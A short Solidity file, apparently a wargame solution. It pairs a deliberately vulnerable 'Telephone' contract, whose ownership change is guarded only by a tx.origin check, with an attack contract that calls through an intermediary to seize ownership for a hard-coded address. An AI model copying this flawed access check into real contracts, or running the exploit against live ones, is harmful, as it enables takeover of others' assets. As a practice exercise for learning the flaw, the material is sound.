// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract HackTelephone {

    Telephone victimContract;

    constructor(address victimAddress) {
        victimContract = Telephone(victimAddress);
    }

    function getOwnership() public {
        victimContract.changeOwner(0x895aA6B33D403F2727F75E79aB7a66Fbc1226459);
    }
}
